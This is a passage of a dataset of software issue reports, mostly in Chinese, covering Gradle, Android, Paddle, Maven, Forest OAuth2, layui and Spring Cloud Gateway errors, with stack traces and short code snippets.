org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.lambda$run$0(DefaultPlanExecutor.java:127) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:191) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.executeNextNode(DefaultPlanExecutor.java:182) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:124) at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64) at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48) at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:56) Caused by: org.gradle.workers.internal.DefaultWorkerExecutor$WorkExecutionException: A failure occurred while executing com.android.build.gradle.internal.tasks.Workers$ActionFacade at org.gradle.workers.internal.DefaultWorkerExecutor$WorkItemExecution.waitForCompletion(DefaultWorkerExecutor.java:336) at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForItemsAndGatherFailures(DefaultAsyncWorkTracker.java:142) at org.gradle.internal.work.DefaultAsyncWorkTracker.access$000(DefaultAsyncWorkTracker.java:34) at org.gradle.internal.work.DefaultAsyncWorkTracker$1.run(DefaultAsyncWorkTracker.java:106) at org.gradle.internal.Factories$1.create(Factories.java:26) at org.gradle.internal.work.DefaultWorkerLeaseService.withoutLocks(DefaultWorkerLeaseService.java:251) at org.gradle.internal.work.DefaultWorkerLeaseService.withoutProjectLock(DefaultWorkerLeaseService.java:162) at org.gradle.internal.work.DefaultWorkerLeaseService.withoutProjectLock(DefaultWorkerLeaseService.java:156) at org.gradle.internal.work.StopShieldingWorkerLeaseService.withoutProjectLock(StopShieldingWorkerLeaseService.java:95) at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForItemsAndGatherFailures(DefaultAsyncWorkTracker.java:102) at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForAll(DefaultAsyncWorkTracker.java:80) at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForCompletion(DefaultAsyncWorkTracker.java:68) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter$3.run(ExecuteActionsTaskExecuter.java:577) at org.gradle.internal.operations.DefaultBuildOperationExecutor$RunnableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:395) at org.gradle.internal.operations.DefaultBuildOperationExecutor$RunnableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:387) at org.gradle.internal.operations.DefaultBuildOperationExecutor$1.execute(DefaultBuildOperationExecutor.java:157) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:242) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:150) at org.gradle.internal.operations.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:84) at org.gradle.internal.operations.DelegatingBuildOperationExecutor.run(DelegatingBuildOperationExecutor.java:31) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeAction(ExecuteActionsTaskExecuter.java:554) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeActions(ExecuteActionsTaskExecuter.java:537) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.access$300(ExecuteActionsTaskExecuter.java:108) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter$TaskExecution.executeWithPreviousOutputFiles(ExecuteActionsTaskExecuter.java:278) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter$TaskExecution.execute(ExecuteActionsTaskExecuter.java:267) at org.gradle.internal.execution.steps.ExecuteStep.lambda$execute$0(ExecuteStep.java:32) at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:32) at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:26) at org.gradle.internal.execution.steps.CleanupOutputsStep.execute(CleanupOutputsStep.java:67) at org.gradle.internal.execution.steps.CleanupOutputsStep.execute(CleanupOutputsStep.java:36) at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:49) at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:34) at org.gradle.internal.execution.steps.CancelExecutionStep.execute(CancelExecutionStep.java:43) at org.gradle.internal.execution.steps.TimeoutStep.executeWithoutTimeout(TimeoutStep.java:73) at org.gradle.internal.execution.steps.TimeoutStep.execute(TimeoutStep.java:54) at org.gradle.internal.execution.steps.CatchExceptionStep.execute(CatchExceptionStep.java:34) at org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:44) at org.gradle.internal.execution.steps.SnapshotOutputsStep.execute(SnapshotOutputsStep.java:54) at org.gradle.internal.execution.steps.SnapshotOutputsStep.execute(SnapshotOutputsStep.java:38) at org.gradle.internal.execution.steps.BroadcastChangingOutputsStep.execute(BroadcastChangingOutputsStep.java:49) at org.gradle.internal.execution.steps.CacheStep.executeWithoutCache(CacheStep.java:159) at org.gradle.internal.execution.steps.CacheStep.execute(CacheStep.java:72) at org.gradle.internal.execution.steps.CacheStep.execute(CacheStep.java:43) at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:44) at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:33) at org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:38) at org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:24) at org.gradle.internal.execution.steps.SkipUpToDateStep.executeBecause(SkipUpToDateStep.java:92) at org.gradle.internal.execution.steps.SkipUpToDateStep.lambda$execute$0(SkipUpToDateStep.java:85) at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:55) at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:39) at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:76) at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:37) at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:36) at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:26) at org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:94) at org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:49) at org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:79) at org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:53) at org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:74) at org.gradle.internal.execution.steps.SkipEmptyWorkStep.lambda$execute$2(SkipEmptyWorkStep.java:78) at org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:78) at org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:34) at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsStartedStep.execute(MarkSnapshottingInputsStartedStep.java:39) at org.gradle.internal.execution.steps.LoadExecutionStateStep.execute(LoadExecutionStateStep.java:40) at org.gradle.internal.execution.steps.LoadExecutionStateStep.execute(LoadExecutionStateStep.java:28) at org.gradle.internal.execution.impl.DefaultWorkExecutor.execute(DefaultWorkExecutor.java:33) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:194) at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:186) at org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:114) at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46) at org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:62) at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57) at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56) at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:409) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:399) at org.gradle.internal.operations.DefaultBuildOperationExecutor$1.execute(DefaultBuildOperationExecutor.java:157) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:242) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:150) at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:94) at org.gradle.internal.operations.DelegatingBuildOperationExecutor.call(DelegatingBuildOperationExecutor.java:36) at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52) at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:41) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:356) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:343) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:336) at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:322) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.lambda$run$0(DefaultPlanExecutor.java:127) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:191) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.executeNextNode(DefaultPlanExecutor.java:182) at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:124) at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64) at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48) at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:56) Caused by: java.lang.RuntimeException: Manifest merger failed with multiple errors, see logs at com.android.build.gradle.internal.tasks.manifest.ManifestHelperKt.mergeManifestsForApplication(ManifestHelper.kt:183) at com.android.build.gradle.tasks.ProcessLibraryManifest$ProcessLibRunnable.run(ProcessLibraryManifest.java:214) at com.android.build.gradle.internal.tasks.Workers$ActionFacade.run(Workers.kt:242) at org.gradle.workers.internal.AdapterWorkAction.execute(AdapterWorkAction.java:57) at org.gradle.workers.internal.DefaultWorkerServer.execute(DefaultWorkerServer.java:63) at org.gradle.workers.internal.NoIsolationWorkerFactory$1$1.create(NoIsolationWorkerFactory.java:67) at org.gradle.workers.internal.NoIsolationWorkerFactory$1$1.create(NoIsolationWorkerFactory.java:63) at org.gradle.internal.classloader.ClassLoaderUtils.executeInClassloader(ClassLoaderUtils.java:97) at org.gradle.workers.internal.NoIsolationWorkerFactory$1.lambda$execute$0(NoIsolationWorkerFactory.java:63) at org.gradle.workers.internal.AbstractWorker$1.call(AbstractWorker.java:44) at org.gradle.workers.internal.AbstractWorker$1.call(AbstractWorker.java:41) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:409) at org.gradle.internal.operations.DefaultBuildOperationExecutor$CallableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:399) at org.gradle.internal.operations.DefaultBuildOperationExecutor$1.execute(DefaultBuildOperationExecutor.java:157) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:242) at org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:150) at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:94) at org.gradle.internal.operations.DelegatingBuildOperationExecutor.call(DelegatingBuildOperationExecutor.java:36) at org.gradle.workers.internal.AbstractWorker.executeWrappedInBuildOperation(AbstractWorker.java:41) at org.gradle.workers.internal.NoIsolationWorkerFactory$1.execute(NoIsolationWorkerFactory.java:60) at org.gradle.workers.internal.DefaultWorkerExecutor.lambda$submitWork$2(DefaultWorkerExecutor.java:200) at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.runExecution(DefaultConditionalExecutionQueue.java:215) at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.runBatch(DefaultConditionalExecutionQueue.java:164) at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.run(DefaultConditionalExecutionQueue.java:131) ... 3 more"
"""fix ci failed""",fix #5522:图像分类使用vgg模型如何优化参数，降低测试集上分类错误率。 introduced can not find error.   <code>: mkl_cblas.h
如何用 maven 创建自己的微服务,"pig版本:3.2.1 请问如何修改 比如说我想创建一个自己目录的自己项目,如下 pom文件也报错   <code>: mvn archetype:generate ^ -DgroupId=com.pig4cloud ^ -DartifactId=demo ^ -Dversion=3.2.1 ^ -Dpackage=com.pig4cloud.pig.demo ^ -DarchetypeGroupId=com.pig4cloud.archetype ^ -DarchetypeArtifactId=pig-gen ^ -DarchetypeVersion=3.2.1 ^ -DarchetypeCatalog=local mvn archetype:generate ^ -DgroupId=com.company ^ -DartifactId=test ^ -Dversion=3.2.1 ^ -Dpackage=com.company.pig.test ^ -DarchetypeGroupId=com.pig4cloud.archetype ^ -DarchetypeArtifactId=pig-gen ^ -DarchetypeVersion=3.2.1 ^ -DarchetypeCatalog=local"
加载更多时BaseRecyclerAdapter报了下面问题,improve.base.adapter.BaseRecyclerAdapter 在加载数据时报了以下信息： 求解。   <code>: RecyclerView: Cannot call this method in a scroll callback. Scroll callbacks might be run during a measure &amp; layout pass where you cannot change the RecyclerView data. Any method call that might change the structure of the RecyclerView or the adapter contents should be postponed to the next frame. java.lang.IllegalStateException: at android.support.v7.widget.RecyclerView.assertNotInLayoutOrScroll(RecyclerView.java:2526) at android.support.v7.widget.RecyclerView$RecyclerViewDataObserver.onItemRangeChanged(RecyclerView.java:4866) at android.support.v7.widget.RecyclerView$AdapterDataObservable.notifyItemRangeChanged(RecyclerView.java:11084) at android.support.v7.widget.RecyclerView$AdapterDataObservable.notifyItemRangeChanged(RecyclerView.java:11075) at android.support.v7.widget.RecyclerView$Adapter.notifyItemChanged(RecyclerView.java:6575)
将@OAuth2注解仅放在接口类上时，调用接口抛出NullPointerException,Forest: 1.5.16 Backend: (okhttp或httpclient)/version 该问题是如何引起的？ 将@OAuth2注解仅放在接口类上，该接口的方法无@OAuth2，调用该接口抛出NullPointerException 将@OAuth2注解仅放在接口类上，进行调用接口 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口信息：   <code>: java.lang.NullPointerException: null at com.dtflys.forest.lifecycles.authorization.OAuth2LifeCycle.executeRequestToken(OAuth2LifeCycle.java:212) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.lifecycles.authorization.OAuth2LifeCycle.requestToken(OAuth2LifeCycle.java:178) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.lifecycles.authorization.OAuth2LifeCycle.obtainTokenCache(OAuth2LifeCycle.java:128) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.lifecycles.authorization.OAuth2LifeCycle.getTokenCache(OAuth2LifeCycle.java:98) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.lifecycles.authorization.OAuth2LifeCycle.beforeExecute(OAuth2LifeCycle.java:42) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.interceptor.InterceptorChain.beforeExecute(InterceptorChain.java:49) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:3863) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:3903) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1375) ~[forest-core-1.5.14.jar:na] at com.dtflys.forest.proxy.InterfaceProxyHandler.invoke(InterfaceProxyHandler.java:211) ~[forest-core-1.5.14.jar:na] at com.sun.proxy.$Proxy75.advertisement(Unknown Source) ~[na:na] at com.dtflys.forest.example.controller.AppTestController.gitee(AppTestController.java:20) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_212] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_212] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_212] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_212] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) ~[spring-webmvc-4.3.10.RELEASE.jar:4.3.10.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) ~[tomcat-embed-websocket-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:105) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:81) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.10.RELEASE.jar:4.3.10.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) ~[tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:478) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:80) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:799) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1455) [tomcat-embed-core-8.5.16.jar:8.5.16] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-8.5.16.jar:8.5.16] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_212] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_212] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-8.5.16.jar:8.5.16] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_212]
ENH: support command `make target_name`,"If you merge multiple libs into a single ones, like memory.a + tensor.a =&gt; singleton.a This PR allows you to make singleton from Terminal under Mac OS X: UNIX already supported this feature, therefore no update to that case.   <code>: cc_library(singleton DEPS memory tensor) cmake .. make singleton"
下载预训练模型时，发生错误 No module named 'ppcls',"基本环境：centos7 cuda10.1 cudnn7.6.5 python3.6.10 paddle1.8.3 按照 30分钟玩转PaddleClas 这里第二部分，下载预训练模型时执行以下命令 发生 No module named 'ppcls' 错误，请问如何解决，谢谢！   <code>: $ ls configs dataset docs LICENSE ppcls README_en.md README.md requirements.txt tools $ export PYTHONPATH=./:$PYTHONPATH $ sudo python tools/download.py -a MobileNetV3_large_x1_0 -p ./pretrained -d True Traceback (most recent call last): File ""tools/download.py"", line 17, in &lt;module&gt; from ppcls import model_zoo ModuleNotFoundError: No module named 'ppcls'"
Some important concepts do not have a unified name in Fluid's doc.,"Take the LoDTensorArray for example, we have: https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/layers/control_flow.py#L790 https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/layers/control_flow.py#L930 tensor array: https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/layers/control_flow.py#L880 array: https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/layers/control_flow.py#L691 It is quite confusing to have so many names and not give a clear context when a particular name will be used.   <code>: LOD_TENSOR_ARRAY"
发现layui数据表格一个bug，列含有数值型字段时obj.update()将失效（确认是bug），希望能及时在新版本修正。,"数据表格渲染的数据列中如果传过来的值含有数值列时，使用obj.update(data)将失效。 发现过程如下： 实例场景是服务端时springboot2返回的数据，其中有些列数据是double类型，表格查询时能正常渲染显示，当对某行数据修改后进行更新时，发现失效。百思不得其解，后怀疑是字段类型问题，将后端的double列数据转成字符串类型后再传到前端数据表格，此时update生效，这应该算是个bug吧。 样例代码如下：   <code>: table.on('tool(table2)', function (obj) { let data = obj.data; if (obj.event === 'modify') { data.name = ""新的值"";//当后端传来的data值含有数值列，不论改任何字段的值，下面的update都失效（都是字符串列则没问题）。 obj.update(data); } }"
add exclude_patterns for conf.py.in,"在conf.py.in中增加。由于这里的规则和正则表达式的有所不同，只能识别当前路径下的_en文件，不能识别所有路径下的_en文件，即不能识别；所以再用来识别所有子路径下的_en文件。 对生成的文件进行exclude_patterns过滤后，ref指定不需要区别中英文，因此把所有的后缀名去掉了。 在cmake/FindSphinx.cmake中，对index_en(cn).html软连接到index.html。原因是：linkchecker 对每个子页面，都会检查类似 ../../index.html的路径。没有index.html页面，会报错。   <code>: exclude_patterns=['**/*_en*', '*_en*'] *_en* / **/*_en*'"
【动态路由】RedisRouteDefinitionWriter类的相关疑问,"主要是在阅读源码的时候发现 并没有使用save和delete方法 认为getRouteDefition方法已经足够 所以 这边觉得只要实现RouteDefinitionLocator 而不是RouteDefinitionRepository就好了 因为不规范。所以修改。以下是原问题。 RedisRouteDefinitionWriter 在调试过程中发现这两个方法就算没有 路由也会刷新。 这两个方法是否没有用到？   <code>: @Override public Mono&lt;Void&gt; save(Mono&lt;RouteDefinition&gt; route) { return route.flatMap(r -&gt; { RouteDefinitionVo vo = new RouteDefinitionVo(); BeanUtils.copyProperties(r, vo); log.info(""保存路由信息{}"", vo); redisTemplate.opsForHash().put(CommonConstant.ROUTE_KEY, r.getId(), vo); return Mono.empty(); }); } @Override public Mono&lt;Void&gt; delete(Mono&lt;String&gt; routeId) { routeId.subscribe(id -&gt; { log.info(""删除路由信息{}"", id); redisTemplate.opsForHash().delete(CommonConstant.ROUTE_KEY, id); }); return Mono.empty(); }"
多次文件上传报错,"【版本】2.0.8 【问题】如题，测试上传Excel文件多次触发后报错，错误出现频次很频繁，一般刷新下页面就OK，第一次一般没有问题。 【错误情况】 【源代码】   <code>: @ApiOperation(httpMethod = Const.POST_METHOD, value = ""query:导入"") @ApiOperationSupport(order = 5) @PostMapping(""/import"") public R excelImport(ExcelInfo excelInfo, @RequestParam(""file"") MultipartFile file) throws Exception { excelInfo.setDic(""abc""); excelService.importExcelData(excelInfo, file); return R.success().message(""导入成功""); }"
